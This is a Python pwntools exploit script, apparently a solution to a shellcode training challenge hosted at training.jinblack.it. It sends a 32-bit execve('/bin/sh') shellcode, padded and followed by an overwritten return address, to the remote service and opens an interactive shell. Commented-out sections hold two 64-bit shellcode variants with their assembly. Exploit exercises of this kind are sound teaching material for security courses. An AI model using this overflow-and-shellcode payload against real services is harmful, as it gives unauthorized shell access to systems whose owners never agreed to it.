#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
#r = process("./sh3llc0d3")
#gdb.attach(r, """
#	c
#	""")

r = remote("training.jinblack.it", 2002)
input("wait")

shellcode = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
shellcode = shellcode.ljust(212, b"A") + b"\x60\xc0\x04\x08" #+ p64(0x0804c060)
shellcode = shellcode.ljust(1001, b"A")
#shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
#payload = shellcode.ljust(1001, b"A") #+ p64(buffer)
#payload = b"A"*212
r.send(shellcode)


#print(r.recvuntil("name?\n"))

#buffer = 0x601080

# First shellcode
# mov rax, 0x3b
# mov rdi, 0x601148
# mov rsi, 0x601150
# mov rdx, 0x601150
# syscall

#shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x48\x11\x60\x00\x48\xC7\xC6\x50\x11\x60\x00\x48\xC7\xC2\x50\x11\x60\x00\x0F\x05"
#shellcode = shellcode.ljust(200, b"\x90")
#shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8


#second shellcode
# jmp endshellcode
# shellcode:
# pop rdi
# mov rsi, rdi
# add rsi, 8
# mov rdx, rsi
# mov rax, 0x3b
# syscall

# endshellcode:
# call shellcode
# nop



#shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
#shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

#payload = shellcode.ljust(1016, b"\x90") + p64(buffer)

#r.send(payload)

r.interactive()
